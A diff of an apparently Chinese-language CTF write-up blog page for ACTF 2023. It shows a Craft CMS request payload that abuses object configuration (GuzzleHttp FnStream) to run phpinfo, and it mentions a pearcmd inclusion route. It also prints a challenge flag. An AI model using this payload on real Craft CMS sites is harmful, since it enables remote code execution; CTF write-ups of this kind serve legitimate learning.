@@ -248,7 +248,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">181字</span>
+        <span class="post-count">214字</span>
       </span>
     </span>
 
@@ -272,7 +272,7 @@
     </div>
     
     <div class="content" v-pre>
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>忘了留时间打这个了，速通签到了个原神大学就润了（</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>忘了留时间打这个了，速通签到了个原神大学就润了，看看别人的复现（</p>
 <span id="more"></span>
 
 <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="craftcms（未完成）"><a href="#craftcms（未完成）" class="headerlink" title="craftcms（未完成）"></a>craftcms（未完成）</h2><blockquote>
@@ -283,8 +283,8 @@
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">action<span class="token operator">=</span>conditions<span class="token operator">/</span>render<span class="token operator">&amp;</span>configObject<span class="token operator">=</span>craft\elements\conditions\ElementCondition<span class="token operator">&amp;</span>config<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"configObject"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"as "</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"class"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"\\GuzzleHttp\\Psr7\\FnStream"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"__construct()"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"close"</span><span class="token punctuation">:</span><span class="token constant">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"_fn_close"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/blog/2023/10/29/ACTF2023/image-20231029095702028.png" alt="image-20231029095702028"></p>
-<p>尝试日志包含，发现打不通。。。</p>
-<p>但是查看phpinfo可以发现开了<code>register_argc_argv</code>，也就是说可以用pearcmd打</p>
+<p>尝试日志包含，发现打不通。。。应该是没生成日志文件</p>
+<p>但是查看phpinfo可以发现开了<code>register_argc_argv</code>，结合日志包含肯定存在<code>include</code>函数这一点，也就是说可以用pearcmd打</p>
 <hr>
 <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="SIGNIN-东方原神大学"><a href="#SIGNIN-东方原神大学" class="headerlink" title="SIGNIN: 东方原神大学"></a>SIGNIN: 东方原神大学</h2><p>访问www.东方原神大学.com，趁还没重定向跳转到浙大官网，ctrl+u获得flag</p>
 <p>flag：<code>ACTF&#123;w2Lc0Me_2_@ctF2o23#azUr3_A$$asS1N_alIiaNc3&#125;</code></p>
